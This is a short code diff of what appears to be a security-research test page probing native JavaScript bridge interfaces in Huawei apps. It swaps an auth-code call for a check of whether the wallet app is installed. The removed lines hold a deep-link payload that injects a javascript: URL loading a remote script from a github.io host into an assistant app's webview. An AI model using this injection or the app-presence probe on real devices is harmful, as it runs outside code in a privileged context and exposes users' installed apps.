@@ -36,21 +36,15 @@
         // ========================= API调用逻辑（统一管理） =========================
         // 延迟执行API调用（合并所有setTimeout，统一100ms延迟）
         setTimeout(() => {
-            // 防错：检测Native对象是否存在
-            if (typeof HiSearchNative === 'undefined' || !HiSearchNative.getAuthCode) {
-                resultContainer.innerHTML += `<div class="err">❌ HiSearchNative 接口未定义</div>`;
-                return;
-            }
-
             // 调用Native接口并捕获异常
-            HiSearchNative.getAuthCode()
+            hidiskOperation.isPackageInstall('com.huawei.hmos.wallet')
                 .then(data => {
                     // 转义HTML特殊字符，避免XSS
                     const safeData = JSON.stringify(data).replace(/[&<>"']/g, char => {
                         const escapeMap = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
                         return escapeMap[char];
                     });
-                    resultContainer.innerHTML += `<div class="suc">✅ getAuthCode succeed：${safeData}</div>`;
+                    resultContainer.innerHTML += `<div class="suc">✅ getCommonBodyEvent succeed：${safeData}</div>`;
                 })
                 .catch(error => {
                     // 转义错误信息
@@ -58,15 +52,11 @@
                         const escapeMap = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
                         return escapeMap[char];
                     });
-                    resultContainer.innerHTML += `<div class="err">❌ getAuthCode failed：${safeError}</div>`;
+                    resultContainer.innerHTML += `<div class="err">❌ getCommonBodyEvent failed：${safeError}</div>`;
                 });
         }, 100);
 
-        // ========================= API调用逻辑（统一管理） =========================
-        // 延迟执行API调用（合并所有setTimeout，统一100ms延迟）
-        setTimeout(() => {
-            HiSearchNative.splitScreenAndJump('superlink://vassistant?abilityName=MainAbility&bundleName=com.huawei.hmsapp.intelligent&parameters={"page":"WebPage","url":"https%3A%2F%2Fh5hosting-drcn.dbankcdn.cn%2Fcch5%2FScenarizedDist%2FfilePage%2Fdist%2Findex.html%23%2FfilePageMain%3Fid%3Dsww%2BsNgyGsxLB%2BVgDku8rswI5V4hLmFtRFTAlklxoWQ%3D%26language%3Dzh_CN%26url%3Djavascript%3As%3Ddocument.createElement(%27script%27)%2Cs.src%3D%27https%3A%2F%2Fideet.github.io%2Fhuhu%2FJS%2Fhiboard.js%27%2Cs.onload%3D()%3D%3Ealert(%27JS%27)%2Cdocument.head.appendChild(s)"}');
-        }, 3000);
+
     };
 
     // 确保DOM加载完成后初始化
